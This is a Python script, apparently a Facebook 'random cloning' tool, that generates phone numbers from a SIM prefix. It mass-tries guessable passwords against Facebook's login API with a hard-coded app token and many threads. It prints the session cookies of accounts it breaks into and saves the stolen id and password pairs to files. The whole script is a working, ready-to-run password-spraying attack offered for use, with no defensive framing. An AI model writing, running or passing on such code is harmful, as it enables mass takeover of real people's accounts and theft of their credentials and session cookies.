#WRITTEN BY MR.DIPTO
#FOLLOW : https://github.com/MR-DIPTO-404
#------------- import -------------#
import os
from os import system as clr
import random
import string 
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
import sys
import uuid
import json
#-------------color----------------#
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
my_color = [
 B,C,P,H]
warna = random.choice(my_color)
oks=[]
cps=[]
loop=0
#-------------logo-----------------#
logo=("""\033[1;32m
\x1b[1;95m ████████  ______ _____ _____  _   __ ___________  
\x1b[38;5;46m    ██    | ___ \_   _/  __ \| | / /|  ___| ___ \ 
\x1b[1;91m    ██    |    /  | | | |    |    \ |  __||    /  
\x1b[1;93m    ██    | |\ \ _| |_| \__/\| |\  \| |___| |\ \  
\x1b[1;95m    ██    \_| \_|\___/ \____/\_| \_/\____/\_| \_| 

\033[1;93m--------------------------------------------------
\x1b[1;91m[𝙅𝙐𝙎𝙏 𝙁𝙀𝙀𝙇 𝙏𝙃𝙀 𝙋𝙊𝙒𝙀𝙍 𝙊𝙁 𝙏𝙍𝙄𝘾𝙆𝙀𝙍 👿😀🤫]
\033[1;93m--------------------------------------------------
\x1b[1;93m[-] OWNER     :\033[1;32m ❥✴𓆩𝙏𝙍𝙄𝘾𝙆𝙀𝙍𓆪♥✯𓄂
\x1b[1;95m[-] FACEBOOK  :\033[1;32m ⟨ˌ𝐓Ɽ𝐈𝐂̧͜͡𝐊Ɜ͜Ɽˈ⟩爾⸙ 🥵👿
\033[1;37m[-] VERSION   :\033[1;32m 120.1
\x1b[1;93m[-] STATUS    :\033[1;32m Paid
--------------------------------------------------""")
def linex():
	print('\033[0;97m------------------------------------------------')
#-------------clear def -------------#
def clear():
    clr('clear')
    print(logo)
    
#-------------main def------------#
def MR_DIPTO():
    clear()
    os.system('xdg-open https://youtube.com/@muzammiltricker?si=mGHLF2ZJ50eSSlEo')
    print(f'{B} [{warna}01{B}] RANDOM CLONING ')
    print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
    linex()
    option=input(f' {B}[{warna}??{B}] CHOICE MENU >> ')
    if option in ['01','1']:
        Pak()
    else:
        exit(' Thanks for using dear :)')
#------------- bd clone def ----------#
def Pak():
    user=[]
    clear()
    print(' EXAMPLE SIM CODE : [0301] [0317] [0323] [0340]')
    code=input(' ENTER SIM CODE >> ')
    linex()
    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit=int(input(' ENTER LIMIT >> '))
    except ValueError:
        limit=50000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=60) as Dipto:
        tl=str(len(user))
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'khankhan','khan1122','khan12','khan123','khan123456']
            Dipto.submit(method_crack,ids,passlist)
    linex()
    print(' THE PROGRESS HAS BEEN COMPLETE ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
    MR_DIPTO()
#------------ method crack def ---------#
def method_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header={'ua' : 'Mozilla/5.0 (Linux; Android 11; Infinix X662 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/445.0.0.34.118;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            #'Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 ['/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=1.5,width=480,height=800};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]
            url='https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[SUCCESSFUL😃] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    open('/sdcard/SUCCESSFUL😃.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[PROGRAM TO WAR GYA😂💔-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/PROGRAM TO WAR GYA😂💔-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#-------------end----------------#
MR_DIPTO()
